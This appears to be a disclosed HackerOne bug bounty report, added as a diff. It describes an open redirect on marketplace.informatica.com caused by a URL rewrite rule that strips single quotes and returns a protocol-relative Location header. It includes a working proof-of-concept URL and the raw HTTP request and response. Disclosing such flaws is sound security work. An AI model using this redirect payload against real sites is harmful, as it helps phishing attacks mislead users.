@@ -1,0 +1,26 @@
+ReportLink:https://hackerone.com/reports/123625
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/albinowax
+ReportedTo:Informatica(informatica)
+BountyAmount:
+Severity:low
+State:Closed
+DateOfDisclosure:27.06.2016 12:38:34
+
+Summary:
+
+marketplace.informatica.com contains an open redirect due to a flawed URL rewrite rule. All requests containing a single quote: ' are met with a 302 redirect to the same URL, minus the single quote. As the Location header uses a protocol-relative URL, this can be abused to redirect people to arbitrary external sites.
+
+To replicate this issue, load the following URL and observe that you land on google.com: https://marketplace.informatica.com//google.com?q=ohdear&a'b
+
+GET //google.com?q=ohdear&a' HTTP/1.1
+Host: marketplace.informatica.com
+Connection: close
+
+HTTP/1.0 302 Found
+Location: //google.com?q=ohdear&a
+Server: BigIP
+Connection: close
+Content-Length: 0
+
+Open redirects are frequently used to make phishing attacks more effective.
